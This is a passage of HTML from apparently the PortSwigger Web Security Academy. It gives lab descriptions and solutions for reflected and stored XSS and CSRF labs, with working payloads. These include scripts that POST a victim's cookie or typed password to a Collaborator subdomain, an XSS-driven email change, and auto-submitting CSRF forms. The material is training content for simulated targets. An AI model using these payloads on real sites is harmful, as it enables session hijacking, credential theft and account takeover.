                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/1bf4b9250fa4c31d4444f2adf45736c70dd7e5515f1e35a50f3e5d1f74969d63?referrer=%2fweb-security%2fcross-site-scripting%2fcontexts%2flab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Submit a random alphanumeric string in the search box, then use Burp Suite to
                                    intercept the search request and send it to Burp Repeater.
                                </li>
                                <li>
                                    Observe that the random string has been reflected inside a JavaScript string.
                                </li>
                                <li>
                                    Try sending the payload
                                    <code>
        test'payload
       </code>
                                    and observe that your single quote gets backslash-escaped, preventing you from
                                    breaking out of the string.
                                </li>
                                <li>
                                    Try sending the payload
                                    <code>
        test\payload
       </code>
                                    and observe that your backslash doesn't get escaped.
                                </li>
                                <li>
                                    <p>
                                        Replace your input with the following payload to break out of the JavaScript
                                        string and inject an alert:
                                    </p>
                                    <code class="code-scrollable">
        \'-alert(1)//
       </code>
                                </li>
                                <li>
                                    Verify the technique worked by right clicking, selecting "Copy URL", and pasting the
                                    URL in the browser. When you load the page it should trigger an alert.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/cross-site-scripting/stored">
                    Stored XSS
                </a>
                into
                <code>
   onclick
  </code>
                event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
                (cross-site-scripting)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/cross-site-scripting/stored">
                    stored cross-site scripting
                </a>
                vulnerability in the comment functionality.
            </p>
            <p>
                To solve this lab, submit a comment that calls the
                <code>
   alert
  </code>
                function when the comment author name is clicked.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/53ddf9ef1abeee631133a34645f234b5a0115eb9e739c4cebbe2a4668735893b?referrer=%2fweb-security%2fcross-site-scripting%2fcontexts%2flab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Post a comment with a random alphanumeric string in the "Website" input, then use
                                    Burp Suite to intercept the request and send it to Burp Repeater.
                                </li>
                                <li>
                                    Make a second request in the browser to view the post and use Burp Suite to
                                    intercept the request and send it to Burp Repeater.
                                </li>
                                <li>
                                    Observe that the random string in the second Repeater tab has been reflected inside
                                    an
                                    <code>
        onclick
       </code>
                                    event handler attribute.
                                </li>
                                <li>
                                    <p>
                                        Repeat the process again but this time modify your input to inject a JavaScript
                                        URL that calls
                                        <code>
         alert
        </code>
                                        , using the following payload:
                                    </p>
                                    <code class="code-scrollable">
        http://foo?&amp;apos;-alert(1)-&amp;apos;
       </code>
                                </li>
                                <li>
                                    Verify the technique worked by right-clicking, selecting "Copy URL", and pasting the
                                    URL in the browser. Clicking the name above your comment should trigger an alert.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/cross-site-scripting/reflected">
                    Reflected XSS
                </a>
                into a template literal with angle brackets, single, double quotes, backslash and backticks
                Unicode-escaped
                (cross-site-scripting)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/cross-site-scripting/reflected">
                    reflected cross-site scripting
                </a>
                vulnerability in the search blog functionality. The reflection occurs inside a template string with
                angle brackets, single, and double quotes HTML encoded, and backticks escaped. To solve this lab,
                perform a cross-site scripting attack that calls the
                <code>
   alert
  </code>
                function inside the template string.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/0a88d8a0c7685665c8baff00182659bf0a53f478d01725b703663bc726d81776?referrer=%2fweb-security%2fcross-site-scripting%2fcontexts%2flab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Submit a random alphanumeric string in the search box, then use Burp Suite to
                                    intercept the search request and send it to Burp Repeater.
                                </li>
                                <li>
                                    Observe that the random string has been reflected inside a JavaScript template
                                    string.
                                </li>
                                <li>
                                    Replace your input with the following payload to execute JavaScript inside the
                                    template string:
                                    <code>
        ${alert(1)}
       </code>
                                </li>
                                <li>
                                    Verify the technique worked by right clicking, selecting "Copy URL", and pasting the
                                    URL in the browser. When you load the page it should trigger an alert.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/cross-site-scripting/exploiting">
                    Exploiting cross-site scripting
                </a>
                to steal cookies
                (cross-site-scripting)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/cross-site-scripting/stored">
                    stored XSS
                </a>
                vulnerability in the blog comments function. A simulated victim user views all comments after they are
                posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use
                this cookie to impersonate the victim.
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    To prevent the Academy platform being used to attack third parties, our firewall blocks interactions
                    between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's
                    default public server.
                </p>
                <p>
                    Some users will notice that there is an alternative solution to this lab that does not require Burp
                    Collaborator. However, it is far less subtle than exfiltrating the cookie.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/0c567d752c198d06a7a3e449249118740a13247871b21c6aab286522fe52f6aa?referrer=%2fweb-security%2fcross-site-scripting%2fexploiting%2flab-stealing-cookies"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Using
                                    <a href="https://portswigger.net/burp/pro">
                                        Burp Suite Professional
                                    </a>
                                    , go to the
                                    <a href="https://portswigger.net/burp/documentation/desktop/tools/collaborator">
                                        Collaborator
                                    </a>
                                    tab.
                                </li>
                                <li>
                                    Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your
                                    clipboard.
                                </li>
                                <li>
                                    <p>
                                        Submit the following payload in a blog comment, inserting your Burp Collaborator
                                        subdomain where indicated:
                                    </p>
                                    <code class="code-scrollable">
        &lt;script&gt;
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
&lt;/script&gt;
       </code>
                                    <p>
                                        This script will make anyone who views the comment issue a POST request
                                        containing their cookie to your subdomain on the public Collaborator server.
                                    </p>
                                </li>
                                <li>
                                    Go back to the Collaborator tab, and click "Poll now". You should see an HTTP
                                    interaction. If you don't see any interactions listed, wait a few seconds and try
                                    again.
                                </li>
                                <li>
                                    Take a note of the value of the victim's cookie in the POST body.
                                </li>
                                <li>
                                    Reload the main blog page, using Burp Proxy or Burp Repeater to replace your own
                                    session cookie with the one you captured in Burp Collaborator. Send the request to
                                    solve the lab. To prove that you have successfully hijacked the admin user's
                                    session, you can use the same cookie in a request to
                                    <code>
        /my-account
       </code>
                                    to load the admin user's account page.
                                </li>
                            </ol>
                            <div class="component-labinstructions">
                                <h4>
                                    Alternative solution
                                </h4>
                                <p>
                                    Alternatively, you could adapt the attack to make the victim post their session
                                    cookie within a blog comment by
                                    <a
                                        href="https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf">
                                        exploiting the XSS to perform CSRF
                                    </a>
                                    . However, this is far less subtle because it exposes the cookie publicly, and also
                                    discloses evidence that the attack was performed.
                                </p>
                            </div>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/cross-site-scripting/exploiting">
                    Exploiting cross-site scripting
                </a>
                to capture passwords
                (cross-site-scripting)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/cross-site-scripting/stored">
                    stored XSS
                </a>
                vulnerability in the blog comments function. A simulated victim user views all comments after they are
                posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password
                then use these credentials to log in to the victim's account.
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    To prevent the Academy platform being used to attack third parties, our firewall blocks interactions
                    between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's
                    default public server.
                </p>
                <p>
                    Some users will notice that there is an alternative solution to this lab that does not require Burp
                    Collaborator. However, it is far less subtle than exfiltrating the credentials.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/08d9e37603cfe2ef7cf8a21c19e9fc73e81bb5d992fe2e876f8b6891b1759d43?referrer=%2fweb-security%2fcross-site-scripting%2fexploiting%2flab-capturing-passwords"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Using
                                    <a href="https://portswigger.net/burp/pro">
                                        Burp Suite Professional
                                    </a>
                                    , go to the
                                    <a href="https://portswigger.net/burp/documentation/desktop/tools/collaborator">
                                        Collaborator
                                    </a>
                                    tab.
                                </li>
                                <li>
                                    Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your
                                    clipboard.
                                </li>
                                <li>
                                    <p>
                                        Submit the following payload in a blog comment, inserting your Burp Collaborator
                                        subdomain where indicated:
                                    </p>
                                    <code class="code-scrollable">
        &lt;input name=username id=username&gt;
&lt;input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});"&gt;
       </code>
                                    <p>
                                        This script will make anyone who views the comment issue a POST request
                                        containing their username and password to your subdomain of the public
                                        Collaborator server.
                                    </p>
                                </li>
                                <li>
                                    Go back to the Collaborator tab, and click "Poll now". You should see an HTTP
                                    interaction. If you don't see any interactions listed, wait a few seconds and try
                                    again.
                                </li>
                                <li>
                                    Take a note of the value of the victim's username and password in the POST body.
                                </li>
                                <li>
                                    Use the credentials to log in as the victim user.
                                </li>
                            </ol>
                            <div class="component-labinstructions">
                                <h4>
                                    Alternative solution
                                </h4>
                                <p>
                                    Alternatively, you could adapt the attack to make the victim post their credentials
                                    within a blog comment by
                                    <a
                                        href="https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf">
                                        exploiting the XSS to perform CSRF
                                    </a>
                                    . However, this is far less subtle because it exposes the username and password
                                    publicly, and also discloses evidence that the attack was performed.
                                </p>
                            </div>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/cross-site-scripting/exploiting">
                    Exploiting XSS
                </a>
                to perform CSRF
                (cross-site-scripting)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/cross-site-scripting/stored">
                    stored XSS
                </a>
                vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to perform a
                <a href="https://portswigger.net/web-security/csrf">
                    CSRF attack
                </a>
                and change the email address of someone who views the blog post comments.
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                You cannot register an email address that is already taken by another user. If you
                                change your own email address while testing your exploit, make sure you use a different
                                email address for the final exploit you deliver to the victim.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/49e763496c6cdc049d3bc1855b2cf77f952d4f6c5793794e98ec2c06ca2fc193?referrer=%2fweb-security%2fcross-site-scripting%2fexploiting%2flab-perform-csrf"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Log in using the credentials provided. On your user account page, notice the
                                    function for updating your email address.
                                </li>
                                <li>
                                    If you view the source for the page, you'll see the following information:
                                    <ul>
                                        <li>
                                            You need to issue a POST request to
                                            <code>
          /my-account/change-email
         </code>
                                            , with a parameter called
                                            <code>
          email
         </code>
                                            .
                                        </li>
                                        <li>
                                            There's an anti-CSRF token in a hidden input called
                                            <code>
          token
         </code>
                                            .
                                        </li>
                                    </ul>
                                    This means your exploit will need to load the user account page, extract the CSRF
                                    token, and then use the token to change the victim's email address.
                                </li>
                                <li>
                                    <p>
                                        Submit the following payload in a blog comment:
                                    </p>
                                    <code class="code-scrollable">
        &lt;script&gt;
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&amp;email=test@test.com')
};
&lt;/script&gt;
       </code>
                                    <p>
                                        This will make anyone who views the comment issue a POST request to change their
                                        email address to
                                        <code>
         test@test.com
        </code>
                                        .
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/csrf">
                    CSRF vulnerability
                </a>
                with no defenses
                (csrf)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab's email change functionality is vulnerable to CSRF.
            </p>
            <p>
                To solve the lab, craft some HTML that uses a
                <a href="https://portswigger.net/web-security/csrf">
                    CSRF attack
                </a>
                to change the viewer's email address and upload it to your exploit server.
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                You cannot register an email address that is already taken by another user. If you
                                change your own email address while testing your exploit, make sure you use a different
                                email address for the final exploit you deliver to the victim.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/e099d35e2901da6366800094b6799c4b2a46e0ef8a5b0a66cf018a9138af817d?referrer=%2fweb-security%2fcsrf%2flab-no-defenses"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Open Burp's browser and log in to your account. Submit the "Update email" form, and
                                    find the resulting request in your Proxy history.
                                </li>
                                <li>
                                    <p>
                                        If you're using
                                        <a href="https://portswigger.net/burp/pro">
                                            Burp Suite Professional
                                        </a>
                                        , right-click on the request and select Engagement tools / Generate CSRF PoC.
                                        Enable the option to include an auto-submit script and click "Regenerate".
                                    </p>
                                    <p>
                                        Alternatively, if you're using
                                        <a href="https://portswigger.net/burp/communitydownload">
                                            Burp Suite Community Edition
                                        </a>
                                        , use the following HTML template. You can get the request URL by right-clicking
                                        and selecting "Copy URL".
                                    </p>
                                    <code class="code-scrollable">
        &lt;form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"&gt;
    &lt;input type="hidden" name="email" value="anything%40web-security-academy.net"&gt;
&lt;/form&gt;
&lt;script&gt;
        document.forms[0].submit();
&lt;/script&gt;
       </code>
                                </li>
                                <li>
                                    Go to the exploit server, paste your exploit HTML into the "Body" section, and click
                                    "Store".
                                </li>
                                <li>
                                    To verify that the exploit works, try it on yourself by clicking "View exploit" and
                                    then check the resulting HTTP request and response.
                                </li>
                                <li>
                                    Change the email address in your exploit so that it doesn't match your own.
                                </li>
                                <li>
                                    Click "Deliver to victim" to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: CSRF where token validation depends on request method
                (csrf)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only
                applies defenses to certain types of requests.
            </p>
            <p>
                To solve the lab, use your exploit server to host an HTML page that uses a
                <a href="https://portswigger.net/web-security/csrf">
                    CSRF attack
                </a>
                to change the viewer's email address.
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                You cannot register an email address that is already taken by another user. If you
                                change your own email address while testing your exploit, make sure you use a different
                                email address for the final exploit you deliver to the victim.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/67b30f1019d4da5703cfb696ae747d43ecca9801fa36d4bec720290c4e09451e?referrer=%2fweb-security%2fcsrf%2fbypassing-token-validation%2flab-token-validation-depends-on-request-method"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Open Burp's browser and log in to your account. Submit the "Update email" form, and
                                    find the resulting request in your Proxy history.
                                </li>
                                <li>
                                    Send the request to Burp Repeater and observe that if you change the value of the
                                    <code>
        csrf
       </code>
                                    parameter then the request is rejected.
                                </li>
                                <li>
                                    Use "Change request method" on the context menu to convert it into a GET request and
                                    observe that the CSRF token is no longer verified.
                                </li>
                                <li>
                                    <p>
                                        If you're using
                                        <a href="https://portswigger.net/burp/pro">
                                            Burp Suite Professional
                                        </a>
                                        , right-click on the request, and from the context menu select Engagement tools
                                        / Generate CSRF PoC. Enable the option to include an auto-submit script and
                                        click "Regenerate".
                                    </p>
                                    <p>
                                        Alternatively, if you're using
                                        <a href="https://portswigger.net/burp/communitydownload">
                                            Burp Suite Community Edition
                                        </a>
                                        , use the following HTML template. You can get the request URL by right-clicking
                                        and selecting "Copy URL".
                                    </p>
                                    <code class="code-scrollable">
        &lt;form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"&gt;
    &lt;input type="hidden" name="email" value="anything%40web-security-academy.net"&gt;
&lt;/form&gt;
&lt;script&gt;
        document.forms[0].submit();
&lt;/script&gt;
       </code>
                                </li>
                                <li>
                                    Go to the exploit server, paste your exploit HTML into the "Body" section, and click
                                    "Store".
                                </li>
                                <li>
                                    To verify if the exploit will work, try it on yourself by clicking "View exploit"
                                    and checking the resulting HTTP request and response.
                                </li>
                                <li>
                                    Change the email address in your exploit so that it doesn't match your own.
                                </li>
                                <li>
                                    Store the exploit, then click "Deliver to victim" to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: CSRF where token validation depends on token being present
                (csrf)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab's email change functionality is vulnerable to CSRF.
            </p>
            <p>
                To solve the lab, use your exploit server to host an HTML page that uses a
                <a href="https://portswigger.net/web-security/csrf">
                    CSRF attack
                </a>
                to change the viewer's email address.
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                You cannot register an email address that is already taken by another user. If you
                                change your own email address while testing your exploit, make sure you use a different
                                email address for the final exploit you deliver to the victim.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/464b3ce68cb4a94b23c4dca52f5535b394cb9d940479664818f3fd06c514cd42?referrer=%2fweb-security%2fcsrf%2fbypassing-token-validation%2flab-token-validation-depends-on-token-being-present"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Open Burp's browser and log in to your account. Submit the "Update email" form, and
                                    find the resulting request in your Proxy history.
                                </li>
                                <li>
                                    Send the request to Burp Repeater and observe that if you change the value of the
                                    <code>
        csrf
       </code>
                                    parameter then the request is rejected.
                                </li>
                                <li>
                                    Delete the
                                    <code>
        csrf
       </code>
                                    parameter entirely and observe that the request is now accepted.
                                </li>
                                <li>
                                    <p>
                                        If you're using
                                        <a href="https://portswigger.net/burp/pro">
                                            Burp Suite Professional
                                        </a>
                                        , right-click on the request, and from the context menu select Engagement tools
                                        / Generate CSRF PoC. Enable the option to include an auto-submit script and
                                        click "Regenerate".
                                    </p>
                                    <p>
                                        Alternatively, if you're using
                                        <a href="https://portswigger.net/burp/communitydownload">
                                            Burp Suite Community Edition
                                        </a>
                                        , use the following HTML template. You can get the request URL by right-clicking
                                        and selecting "Copy URL".
                                    </p>
                                    <code class="code-scrollable">
        &lt;form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"&gt;
    &lt;input type="hidden" name="$param1name" value="$param1value"&gt;
&lt;/form&gt;
&lt;script&gt;
    document.forms[0].submit();
&lt;/script&gt;
       </code>
                                </li>
                                <li>
                                    Go to the exploit server, paste your exploit HTML into the "Body" section, and click
                                    "Store".
                                </li>
                                <li>
                                    To verify if the exploit will work, try it on yourself by clicking "View exploit"
                                    and checking the resulting HTTP request and response.
                                </li>
                                <li>
                                    Change the email address in your exploit so that it doesn't match your own.
                                </li>
                                <li>
                                    Store the exploit, then click "Deliver to victim" to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: CSRF where token is not tied to user session
                (csrf)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF
                attacks, but they aren't integrated into the site's session handling system.
            </p>
            <p>
                To solve the lab, use your exploit server to host an HTML page that uses a
                <a href="https://portswigger.net/web-security/csrf">
                    CSRF attack
                </a>
                to change the viewer's email address.
            </p>
            <p>
                You have two accounts on the application that you can use to help design your attack. The credentials
                are as follows:
            </p>
            <ul>
                <li>
                    <code>
    wiener:peter
   </code>
                </li>
                <li>
                    <code>
    carlos:montoya
   </code>
                </li>
            </ul>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                You cannot register an email address that is already taken by another user. If you
                                change your own email address while testing your exploit, make sure you use a different
                                email address for the final exploit you deliver to the victim.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/9eae9022063a6e38c28fc4b7904b4ac75ca324323ceb51dac385ad7dc5c734e5?referrer=%2fweb-security%2fcsrf%2fbypassing-token-validation%2flab-token-not-tied-to-user-session"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Open Burp's browser and log in to your account. Submit the "Update email" form, and
                                    intercept the resulting request.
                                </li>
                                <li>
                                    Make a note of the value of the CSRF token, then drop the request.
                                </li>
                                <li>
                                    Open a private/incognito browser window, log in to your other account, and send the
                                    update email request into Burp Repeater.
                                </li>
                                <li>
                                    Observe that if you swap the CSRF token with the value from the other account, then
                                    the request is accepted.
                                </li>
                                <li>
                                    Create and host a proof of concept exploit as described in the solution to the
                                    <a href="https://portswigger.net/web-security/csrf/lab-no-defenses">
                                        CSRF vulnerability with no defenses
                                    </a>
                                    lab. Note that the CSRF tokens are single-use, so you'll need to include a fresh
                                    one.
                                </li>
                                <li>
                                    Change the email address in your exploit so that it doesn't match your own.
                                </li>
                                <li>
                                    Store the exploit, then click "Deliver to victim" to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: CSRF where token is tied to non-session cookie
                (csrf)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF
                attacks, but they aren't fully integrated into the site's session handling system.
            </p>
            <p>
                To solve the lab, use your exploit server to host an HTML page that uses a
                <a href="https://portswigger.net/web-security/csrf">
                    CSRF attack
                </a>
                to change the viewer's email address.
            </p>
            <p>
                You have two accounts on the application that you can use to help design your attack. The credentials
                are as follows:
            </p>
            <ul>
                <li>
                    <code>
    wiener:peter
   </code>
                </li>
                <li>
                    <code>
    carlos:montoya
   </code>
                </li>
            </ul>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                You cannot register an email address that is already taken by another user. If you
                                change your own email address while testing your exploit, make sure you use a different
                                email address for the final exploit you deliver to the victim.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
